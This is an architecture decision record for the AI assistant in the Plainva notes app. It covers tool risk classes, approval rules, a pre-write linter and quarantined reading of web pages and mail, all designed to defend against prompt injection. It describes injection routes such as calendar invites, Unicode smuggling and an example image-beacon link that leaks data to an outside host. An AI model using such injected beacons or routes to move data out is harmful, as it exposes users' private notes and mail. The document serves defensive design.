# ADR 0019: AI tools, risk classes and approvals

Status: Accepted

Date: 2026-09-24

## Context

The harness acts through tools: it reads the vault, navigates the app and
proposes changes. The same tools are exposed to other AI applications through
Plainva's MCP server (ADR 0022) and, later, to sandboxed script skills.
Model tool selection degrades with large tool lists (Anthropic names 30–50
tools as the point where selection gets worse and recommends tool search from
about ten), and prompt-injected content must not be able to turn a read into
a write or an outside effect.

## Decision

1. **One manifest per tool, in core.** `packages/core/src/ai/tools/` holds the
   manifests: name, description, JSON schema of input and output, risk class,
   capability, data classes it can return, whether results are tier 3, and
   the native counterpart. The harness registry and the MCP server's
   `tools/list` are generated from the same manifests; a tool without a
   manifest does not exist.
2. **Risk classes.**
   - `read` — `search_vault`, `read_note` (section handles), `get_outline`,
     `get_backlinks`, `graph_neighborhood`, `query_base`, `get_tasks`,
     `get_calendar`, `get_recent`, `parse_task`: allowed when AI is on,
     bounded by folder and policy.
   - `ui` — `run_command(id, args)` over the command registry
     (`commandRegistry.ts`): allowed, audited, reversible; a command without a
     handler is not a tool (fail-closed). The command list is a searchable
     resource, not one tool per command. The registry is the palette's, so it
     holds commands that write as well; every command is therefore decided
     in `packages/ui/src/ai/aiCommands.ts` — the assistant's to run, or
     withheld with its reason — and a guard fails the commit for a command
     that is decided nowhere. The assistant's are those that show or arrange
     and write nothing: no file, no setting, no clipboard, no backup, no
     sync run, nothing outside the app, and no surface whose next keystroke
     would create or change something. A shell offers the assistant what its
     own palette has; three commands take an argument (a note to open, a
     note to show in the graph, a day in the calendar), and a note named
     there passes the same gate as a read.
   - `write` — create, append, change: always a **proposal** (suggestion round
     with author `plainva-ai/<model-id>`, a parked draft for new notes, a
     property proposal at the property anchor). Provenance through the OKF
     fields (`generated: {by, at}`, `sources`), stamped only at the moment of
     creation.
     - *A proposed property is a suggestion on the property's entry.* It is
       stored, synced and decided as every suggestion is: the passage is the
       entry in the note's properties, the replacement the entry as it would
       read. Where the anchor quotes the entry it names the property
       (`display: {kind: "property", key}`); a property the note does not
       have is an insertion in front of the line that closes the properties,
       and an insertion carries no hint. An app that knows nothing of this
       accepts the text change and ends up with the right value.
     - *It is applied where the properties are, never where its words are.*
       A decision places it in the note as it is then
       (`placeProposedProperty`, asked by `planCommentDecision` and by every
       card): an entry found only in the text is a suggestion that no longer
       fits, a new property goes in front of the closing line as it stands,
       and one the note has by now is refused instead of written twice.
     - *A database shows a proposed value; it does not keep it.* The value
       proposed for an entry stands in the cell of that entry and that
       property (`buildProposedCells`), read from the note's comments on
       every look — there is no second store, and what a cell decides is the
       operation the note's margin runs (`decideProposedCells` over
       `planCommentDecision`), one decision per note. A database has its
       rows' values, not its notes' texts, so it shows only what still fits
       the row; whether it fits the note is asked again when it is accepted.
       "All" is what the view draws as cells (`proposalColumns`), and many
       notes at once ask first, like every bulk change of a database.
     - *A new entry of a database is a draft* (`create_entry`): a note in the
       folder the database keeps its entries in, with the properties the
       model named — each judged like a value proposed on a note that is
       there, so no rule, no trust field and none of Plainva's own names.
       Where a database has no folder for new entries, nothing is drafted:
       that question is the user's, and an assistant never answers it.
       "Create" is the user's step and writes the note the way the
       database's own "New entry" does without a template.
     - *A run that fills a column is not a conversation* (`fillProperty`):
       the app, not a model, walks the entries. Each note that says nothing
       in the column goes in a request of its own — its properties, its
       headings and its text as the read tools return them, and nothing of
       another note —, with fixed sentences as the instruction and no tool
       at all, so there is nothing a note's text could make the model do.
       The column's name and choices are the vault's text and go with the
       entry, never as part of the instruction. What comes back is read as
       JSON and held against the column's kind and its choices; a value that
       brings an address the model was not given is no value. What is left
       is laid on the note through `set_property` itself — its lint, its
       rules about what a place takes, its round — and waits like every
       proposed value. The run asks once, with every note in one overview,
       takes at most 25 entries, and leaves out an entry a value already
       waits for. A request that fails ends it.
     - *A filter in words sends a database's columns and no entry*
       (`filterFromWords`): their names, kinds and choices, fenced as data,
       and the user's sentence. The answer is held against those columns —
       a column that is not there, an operator its kind does not have, a
       choice it does not offer make the whole answer no filter — and is
       shown as rules before anything is filtered. Applying them is the
       user's own edit of the view; the assistant never writes a `.base`.
   - `critical` — delete, bulk change, vault-wide rename or move, and **any
     write to `plainva.ai.*`, `.agent/` or the OKF trust fields**: dry run and
     confirmation enforced in the tool layer; delete only through the deletion
     guard (sample probe, deletion journal, threshold, backup).
     - *A note's own AI rule is a plan, never a suggestion.* A margin has an
       "accept all", and a rule must not ride along with it: `set_property`
       on `plainva.ai.cloud` or `plainva.ai.web` asks, and the app writes the
       rule after the yes. Taking a rule out is asked with a warning.
     - *The trust fields are not written by an assistant at all* (ADR 0023):
       `generated`, `verified` and `sources` by their name, `status` and
       `stale_after` where the note uses them as trust fields or would after
       the write. The same holds for every name the app's own "add a
       property" refuses (`isReservedPropertyName`): Plainva's namespace, a
       database's virtual columns, `type`, `okf_version`, and the names that
       reach into an object's prototype.
   - `external` — mail, RSVP, moving an event, web or API writes, and any write
     into a surface third parties read (events with attendees, provider tasks,
     mail drafts, shared workspaces, publications): separate confirmation
     every time, shown in the send overview.
   - `script` — signed WASM scripts (later package), manifest-bound.
   - `forbidden` — reading the keychain, raw secrets, an unbounded shell,
     direct DB or file writes outside the adapters, raw SQL. Never a tool.
3. **A small, stable surface.** A conversation loads the tools an answer
   about the vault usually needs — `search_vault`, `read_note`, `get_outline`,
   `query_base`, `get_tasks`, `get_backlinks`, `graph_neighborhood`,
   `get_recent`, `get_calendar`, `get_event`, `run_command` — and two that
   reach the rest: `find_tools` lists further tools and the app's commands
   with their arguments, `call_tool` calls a tool it listed. The tool list of
   a conversation does not change while it runs (append-only, ADR 0018), so
   a further tool is never added to it: the conversation carries its name in
   `more`, fixed like the list, and the request a provider caches stays the
   same whatever is found later.
   - *The dispatcher is a spelling, never a way around a rule.* A call
     through `call_tool` is resolved before anything else looks at it: its
     arguments are validated against the tool it names, and the Rule of Two,
     a skill's narrowing and the approval of an outside effect meet that
     tool. A run is classed by what it can reach, however a tool is spelled.
     On the wire the answer belongs to the call as the provider made it; the
     transcript, the ledger and a skill's scenario name the tool that ran.
   - *What is found.* Only the names in `more`: what a shell can serve and a
     conversation was started with. The internet's tools are chosen when a
     conversation starts and are never found; a conversation bound to a skill
     has no search and carries exactly the tools its skill names.
   - The plan named six always-loaded tools. The eleven here are the ones
     the skills that come with the app name in their instructions — a model
     that loads such a skill is told to call them, and a tool it would first
     have to look for is a step it does not take. Further out stand tools
     that reach another kind of data or are rarely needed; the first is mail.
4. **Results are small and structured.** Paginated, token-lean results;
   section handles instead of full text; structured errors without internal
   paths or SQL; idempotency keys for repeatable writes; every call and result
   audited in the run ledger. Arguments copied verbatim from a tier 3 span
   raise the risk class by one.
5. **Rule of Two at run time.** The orchestrator classifies every run by
   (A) processes untrusted input, (B) sees private data, (C) can change state
   or communicate outward. A run with all three needs an approval for **each**
   outside effect and can never be a routine. Applies from the first chat
   package on.
6. **Pre-write linter.** AI-touched content is checked before it is stored:
   image, link and embed URLs to domains the user has not allowed are defused
   (kept as literal text, or opened only after a click) — including
   protocol-relative `//` URLs, reference-style links (`[x][1]` plus
   `[1]: https://…`) and HTML `<img>`/`<a>`. This closes the rendering-beacon
   class: the desktop CSP allows `img-src https:`, so an injected
   `![](https://host/?d=…)` would otherwise fire on display, past the send
   overview. For what the session stores on a model's behalf — a suggestion
   round, a transcript, a reply in a comment thread — "allowed" is not a
   domain at all: an address stays live only where the user's own text
   already carries it character for character. Allowing its host would let
   the model hang data onto a host a note merely mentions, and the note is
   where an injected instruction comes from. In an answer kept as a note
   (decision 11) no address the model wrote stays live at all.
7. **Guardrails.** Limits for steps, tool calls, tokens and cost with a
   warning at 80 %; a loop guard for repeated identical calls; a circuit
   breaker after three errors; STOP at any time — an abort in the middle of a
   write never leaves half a state, because the write path is atomic.
8. **Unattended runs: one capability set, fixed in advance** (designed with
   the first chat package, built with the routines). A run nobody watches
   gets its capability set when the routine is created, and the user sees it
   then: the tools it may call (the `read` class by default), the folders and
   data classes it may read, the providers it may send to, and a budget per
   run. Nothing widens at run time — a tool outside the set is not offered,
   rather than refused after the call. Whatever needs an approval (every write
   proposal, every external effect) is parked as a pending item in the inbox
   instead of waiting for a person; nothing is carried out unattended. A
   routine that would combine all three Rule-of-Two properties is rejected
   when it is saved, not when it runs. The same set is what a paired MCP or
   ACP client receives (ADR 0022): one capability model for every run without
   a person in front of it.
9. **The internet: three decisions, a native fetch, a reader in quarantine**
   (built with P4). The assistant reaches the internet through two tools,
   `fetch_url` and `web_search`. Both are read tools whose call is itself a
   request to a third party (`outward` in the manifest), so the Rule of Two
   counts them as outside effects.
   - *Three decisions.* The vault allows it: a switch per vault that is off
     until the user decides and lives in the app's data on the device, never
     in the vault, whose writers could otherwise switch it on. The
     conversation was started with it: chosen in the composer for one
     conversation — or by starting a skill that names the two tools
     (decision 11) —, never kept as a default, and fixed like every tool — a
     conversation that began without it may already carry notes whose rules
     say `web: deny`, so it cannot gain the tools later. And the request
     itself is approved: while private data is in the run, every page and
     every search asks, with the whole address or query, because that is
     everything that leaves the device for it. A refusal is an answer to the
     model, not a failed tool; with nobody to ask, the call does not happen.
   - *Where an address came from.* The approval says whether the address
     stood in the conversation before the model wrote it — in the user's
     words, in a note, in a result — or whether the model composed it. Only a
     composed address can carry data out. A standing approval ("always for
     this site", per vault and device) therefore covers addresses that were
     named, never composed ones; the same distinction marks a link in an
     answer. "The same address" is the whole address: accepting its host
     would let a model hang data onto a host a note merely mentions.
     And a source is only what the model did not write first: a tool can
     repeat its arguments in its result, so what the model wrote into an
     answer or a call never counts as a source afterwards, and a result that
     reports an error names none.
   - *`web: deny`.* In a conversation that carries the web tools, a note
     whose rules say `web: deny` contributes nothing — context, tools, link
     anchors — whoever the recipient is, a model on the device included; the
     gists of folders and of the vault, which stand for many notes, stay out
     as well.
   - *The fetch is native.* One GET over https to port 443, without
     credentials, cookies or a body; every address the name resolves to must
     be public, or nothing is sent; redirects are followed inside the site
     only, each hop checked like the first; at most five hops, two megabytes
     and twenty seconds; text only. The rules are plain functions with one
     set of test vectors, mirrored in TypeScript, Rust, Java and Swift. On
     every platform the fetch is code of its own, apart from the egress that
     holds the provider keys.
   - *Planner and reader.* The model that holds the tools never reads a
     page. A second call without any tool reads it, and what returns is a
     record whose fields are checked against the page: a quote must be on it,
     a link too, free text carries no live address. A page can make the
     report say something untrue, and nothing else.
   - *Search.* Through the model provider's own web search, as a call of its
     own that carries the query and nothing of the conversation; only the
     pages the provider reports are passed on. A model on the device reads
     pages and cannot search; the system's own models take no tools at all.
10. **Mail and appointments: other people's words, read by a reader**
    (built with P4-4). Two tools read the user's mail — `search_mail` and
    `read_mail` — and `get_event` reads one appointment in detail.
    - *Two halves, two ways.* The short fields a stranger writes — a mail's
      sender and subject, an appointment's title and place, an attendee's
      name — go to the model that holds the tools as capped single lines
      without a live address, inside a data fence. The free text — a
      message's body, an appointment's description — goes to no model that
      has a tool: the tool hands it over instead of returning it, and the
      reader of decision 9 reports on it, with the same checks. What is read
      is what the user sees: the HTML part of a message without what its
      markup hides, never a plain part the mail program does not show.
    - *The reader runs on the device where it can.* These texts are private
      as well as untrusted. Where a model on the device is set up — the
      conversation's own, or the profile "Local" — it is the reader, and the
      text itself does not leave the device; only the report goes on.
      Otherwise the conversation's provider reads it, in a call of its own
      without tools. A web page is public, so decision 9 keeps its reader
      with the conversation's model.
    - *Mail asks first.* The send overview names the tools of a
      conversation, and mail is not among them: it is found through the tool
      search. So its first call asks, in the conversation — once for a
      recipient, until the app closes; another model or provider is another
      question, and a model on the device is not asked, because nothing
      leaves for it. A no is an answer to the model, not a failed tool. The
      question says who will read a message's text.
    - *Nothing changes.* Reading is `EXAMINE` and `BODY.PEEK` on IMAP and a
      `GET` on Graph: a message the assistant read stays unread. A folder
      name reaches a mail server only as the account lists it, never as a
      model wrote it; a message's handle is checked part by part when it
      comes back. Attachments are named, never opened. The link of an online
      meeting stays in the calendar.
    - *The record holds numbers.* A run's record and the ledger say how many
      searches, messages and descriptions, who read the text, and the
      reader's tokens — never a subject, a sender or a word of a message.
    - *A failure is fenced too.* Whatever names an origin reaches the model
      inside the data fence, a failed tool included: the head of a message
      whose text no reader could report on is still a stranger's subject.
11. **Keeping an answer, and the one skill that reaches the internet** (built
    with P4-6).
    - *"Keep as a note" is the user's act, written by the app.* Under a
      finished answer the user can turn it into a note. No model is asked and
      no tool is called: the app builds the note from the conversation's
      record and writes it under a free name into the vault's inbox folder,
      through the path every new note takes; a note that is there is never
      touched. This is not the `write` class of decision 2, whose writes a
      model proposes — nothing here is a model's to trigger.
    - *The note says who wrote it and what it rests on.* `generated` with the
      model as its actor (ADR 0023), stamped once; a first line that says the
      same in words; and `sources` plus a list under the answer that the app
      takes from the run's own record — the pages it read, the searches it
      made, the notes that went along or were read through a tool — never
      from what the model says it used.
    - *Nothing the model wrote loads or leads anywhere.* The answer's text
      passes the pre-write linter with no exception at all (decision 6): every
      address is inert. The linter does not depend on parsing Markdown, so
      the syntax around an inert address is still that of a link or an
      image; a second pass, which is about how the note reads and not about
      safety, writes those as their words with the address beside them as
      text — nothing is drawn as a link that is none, and an image is never
      an image. The live addresses are the app's own entries for pages the
      run read with the user's approval.
      A beacon needs an address the model composed, and none survives.
      Wikilinks stay: they lead into the vault.
    - *The note inherits the rules of what the answer rests on.* An answer a
      model on the device made from a note kept from the cloud would
      otherwise become an ordinary note in the inbox folder, and the next
      cloud conversation would read it. So the new note carries the rules of
      everything the conversation carried up to that answer (ADR 0018 §11):
      the sources of every overview, the notes pinned to it, the notes that
      embed a picture it sent — and what passed its tools, for which the gate
      itself reports the rules of each note it lets through and the run's
      record keeps the rule, never a path. `cloud: deny` and `web: deny` are
      written into the note where the folder it lands in would allow more. A
      rule that cannot be looked up counts as one that says no.
    - *Where others read, it asks.* In a shared workspace the note is
      readable by its members and by the readers of a publication that covers
      the folder — a write into a surface third parties read (decision 2,
      `external`). The app asks each time, with the note's name and the
      folder; a yes is for one note.
    - *A skill reaches the internet only by naming its tools, and only when
      the user starts it.* A conversation bound to a skill carries exactly the
      tools the skill names (decision 3). A skill whose `allowed-tools` name
      `fetch_url` or `web_search` therefore brings them — where the vault's
      switch is on, and with the question per request of decision 9
      unchanged. Starting such a skill is the second of the three decisions:
      the user chose the internet for this one conversation, and the overview
      and the conversation's first line say so. A skill the model loads by
      itself only narrows a conversation; it never adds the internet to one
      that began without it. One skill that comes with the app does this
      ("research"); a skill from the vault that does is shown as such before
      it is approved (ADR 0020).
    - *Nobody to ask means no.* A regression run of a skill (ADR 0020) is
      watched by nobody: it gets no internet tools whatever its skill names,
      and a kind of data this session has not approved — mail — is answered
      as declined instead of asked for.

## Consequences

- MCP, harness and scripts cannot drift apart: they read one manifest.
- The injection corpus (calendar invite, image beacon, `//` URL, reference
  link, HTML `<img>`, Unicode smuggling) runs in CI against the linter and the
  tier-3 wrapper from the first package on.
- Tools that would need a blanket scope are not built; the model gets
  navigation (`ui`) rather than raw access.
- The internet is never ambient. A conversation without the web tools cannot
  be talked into a request, and one with them asks per request while notes
  are in it. The price is a question per page; standing approvals per site
  pay it down for addresses that were named.
- Reaching a further tool costs the model one more step — the search — and
  a kind of data no overview named costs the user one question per recipient
  and session. In return the list every request carries stays short and the
  same, and mail is never read by a conversation that was not asked about it.
- A mail read by a model on the device is read by a smaller model. The
  report may be thinner than a cloud model's; the text stayed where it was.
- An answer kept as a note is a plain Markdown note the user owns, marked
  for every other tool. A link the model wrote into its answer cannot be
  followed there; the page it stood for is in the list of sources if the run
  read it, and nowhere if the model only named it.
- The skills that come with the app no longer all stay off the internet: one
  names its tools. What a skill may reach is what the user reviews — for a
  skill of the vault before the approval, for every skill in the overview
  before the first request.

## Alternatives

- **One tool per command.** Rejected: 47 desktop commands would push the tool
  count past the range where selection degrades.
- **Direct writes with undo.** Rejected: an injected write that is undone
  later has already been synced, rendered and possibly exfiltrated; proposals
  keep the human in the one approval grammar Plainva already has.
- **A web switch per message.** Rejected: a conversation that began without
  the internet may already carry notes that must never meet it, and what the
  model read cannot be taken back. The choice belongs to the start of a
  conversation, like its other tools.
- **A standing approval that covers every address of a site.** Rejected: an
  address the model composes is the one way data leaves in a GET. Asking for
  exactly those keeps the standing approval safe to give.
- **A search API of Plainva's own choosing, with its own key.** Rejected for
  now: a second account and a second key for every user. Specialised sources
  come through the MCP client instead.
- **Adding a found tool to the conversation's tool list.** Rejected: the
  list is part of what a provider caches and of what the conversation was
  approved with; it stays as it was when the conversation began (ADR 0018).
- **The provider's own tool search (deferred loading).** Not built yet: it
  differs per provider, a model on the device has none, and it could not be
  run against a live API here. The dispatcher works with every model; a
  provider's own search can replace it per adapter later, behind the same
  `more` list.
- **Mail among a conversation's own tools.** Rejected: the first overview of
  every session would then approve mail for conversations that never touch
  it, and a question nobody reads is no consent.
- **The mail's subject and sender through the reader as well.** Rejected:
  a list of messages could then only be had as a report of a report. They
  are short fields — capped, one line, without a live address, fenced — like
  the title of a page a search returns.
- **Every palette command for the assistant.** Rejected: the palette holds
  commands that create, export, send and close. "Changes no data" is a
  promise of `run_command`, so each command is decided, and a new one fails
  the build until it is.
- **A tool with which the model keeps its answer as a note.** Rejected for
  this step: a write a model triggers is a proposal (decision 2) and comes
  with the write tools. Keeping an answer is the user's decision about a text
  they have read, so it is a button, and the app writes.
- **Keeping an answer's own links live where they match a page the run
  read.** Rejected: "the same address" would have to hold after Markdown
  parsing in every renderer a note ever meets. The app's own list gives the
  same links without trusting a character the model wrote.
- **The internet for every skill, in a vault that allows it.** Rejected: a
  skill that never names the web would gain it silently, also one that
  arrived through sync. Naming the tools is what the user reviews.
- **Asking in a regression run.** Rejected: a question nobody is there to
  read would hold the run, and a standing yes for runs nobody watches is the
  capability set of decision 8, which comes with the routines.

## Links

- ADR 0017, ADR 0018, ADR 0022; `packages/ui/src/services/commandRegistry.ts`;
  `packages/core/src/comments/commentActions.ts`;
  `packages/core/src/okf-trust.ts`.
- `packages/core/src/ai/web/` (rules, reader, search, provenance) and the
  native fetch: `apps/desktop/src-tauri/src/ai_web.rs`, `AiWebPlugin.java`,
  `AiWebPlugin.swift`; `docs/engineering/AI_Threat_Model.md` (T2, T17).
- The tool search and the dispatcher: `packages/core/src/ai/tools.ts`,
  `resolveToolCall` in `packages/core/src/ai/orchestrator.ts`. Mail and
  appointments: `packages/ui/src/ai/mailTools.ts`, `eventDetails.ts`,
  `privateData.ts`; the assistant's commands: `packages/ui/src/ai/aiCommands.ts`;
  `docs/engineering/AI_Threat_Model.md` (T18, T19).
- Keeping an answer: `packages/ui/src/ai/aiCapture.ts`, `captureAnswer` in
  `packages/ui/src/ai/aiSession.ts`; a skill and the internet: `skillNamesWeb`
  in `packages/core/src/ai/skills/narrowing.ts`; ADR 0023 §3;
  `docs/engineering/AI_Threat_Model.md` (T22, T23).
